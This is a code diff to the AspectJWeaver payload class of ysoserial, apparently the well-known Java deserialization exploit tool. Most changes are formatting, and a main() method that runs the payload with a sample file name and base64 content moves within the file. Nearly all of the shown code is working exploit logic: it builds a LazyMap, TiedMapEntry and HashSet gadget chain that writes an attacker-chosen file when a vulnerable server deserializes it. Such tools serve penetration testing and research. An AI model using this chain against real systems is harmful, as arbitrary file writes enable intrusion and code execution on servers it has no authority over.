@@ -38,16 +38,21 @@ java -jar ysoserial.jar AspectJWeaver "ahi.txt;YWhpaGloaQ=="
 More information:
 https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
  */
-@PayloadTest(skip="non RCE")
+@PayloadTest(skip = "non RCE")
 @SuppressWarnings({"rawtypes", "unchecked"})
 @Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:3.2.2"})
-@Authors({ Authors.JANG })
+@Authors({Authors.JANG})
 
 public class AspectJWeaver implements ObjectPayload<Serializable> {
 
+    public static void main(String[] args) throws Exception {
+        args = new String[]{"ahi.txt;YWhpaGloaQ=="};
+        PayloadRunner.run(AspectJWeaver.class, args);
+    }
+
     public Serializable getObject(final String command) throws Exception {
         int sep = command.lastIndexOf(';');
-        if ( sep < 0 ) {
+        if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <filename>:<base64 Object>");
         }
         String[] parts = command.split(";");
@@ -57,7 +62,7 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
         Constructor ctor = Reflections.getFirstCtor("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
         Object simpleCache = ctor.newInstance(".", 12);
         Transformer ct = new ConstantTransformer(content);
-        Map lazyMap = LazyMap.decorate((Map)simpleCache, ct);
+        Map lazyMap = LazyMap.decorate((Map) simpleCache, ct);
         TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
         HashSet map = new HashSet(1);
         map.add("foo");
@@ -82,14 +87,14 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
         Object[] array = (Object[]) f2.get(innimpl);
 
         Object node = array[0];
-        if(node == null){
+        if (node == null) {
             node = array[1];
         }
 
         Field keyField = null;
-        try{
+        try {
             keyField = node.getClass().getDeclaredField("key");
-        }catch(Exception e){
+        } catch (Exception e) {
             keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
         }
 
@@ -98,10 +103,5 @@ public class AspectJWeaver implements ObjectPayload<Serializable> {
 
         return map;
 
-    }
-
-    public static void main(String[] args) throws Exception {
-        args = new String[]{"ahi.txt;YWhpaGloaQ=="};
-        PayloadRunner.run(AspectJWeaver.class, args);
     }
 }
